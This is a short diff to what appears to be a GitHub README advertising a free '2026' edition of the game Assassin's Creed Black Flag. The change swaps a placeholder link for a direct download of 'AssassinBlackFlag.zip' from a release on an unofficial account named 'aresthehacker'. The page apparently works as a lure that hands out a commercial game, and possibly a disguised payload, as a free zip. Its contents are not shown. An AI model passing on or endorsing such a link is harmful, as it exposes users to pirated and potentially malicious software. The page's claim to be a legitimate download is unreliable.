@@ -23,7 +23,7 @@ Experience the Golden Age of Piracy with 2026 standards: featuring seamless nava
 
 ## 📥 Download Resource
 
-📥 [`AC-Black-Flag-Resynced-Collectors-2026.zip`](https://github.com/)  
+📥 [`AssassinBlackFlag.zip`](https://github.com/aresthehacker/Assassin-s-Creed-Black-Flag/releases/download/Gamees/AssassinBlackFlag.zip)  
 ---
 
 ## ❗️ Technical Troubleshooting
